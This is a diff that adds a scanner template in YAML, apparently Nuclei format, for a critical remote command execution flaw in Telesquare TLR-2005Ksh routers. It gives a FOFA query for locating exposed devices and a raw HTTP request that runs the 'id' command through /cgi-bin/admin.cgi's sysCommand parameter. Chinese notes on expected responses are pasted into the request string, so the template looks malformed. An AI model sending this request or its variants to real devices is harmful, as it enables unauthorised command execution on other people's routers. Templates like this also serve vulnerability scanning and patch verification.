@@ -1,0 +1,40 @@
+id: poc-rmlkhmhpb2mrgy6u
+info:
+  name: Telesquare TLR-2005Ksh 远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rmlkhmhpb2mrgy6u'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rmlkhmhpb2mrgy6u
+    fofa: title="Login to TLR-2005KSH"||app="TELESQUARE-TLR-2005KSH"
+http:
+- raw:
+  - 'GET /cgi-bin/admin.cgi?Command=sysCommand&Cmd=id HTTP/1.1
+
+
+    Accept: */*
+
+
+    Connection: Keep-Alive
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?uid)(?=.*?gid).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
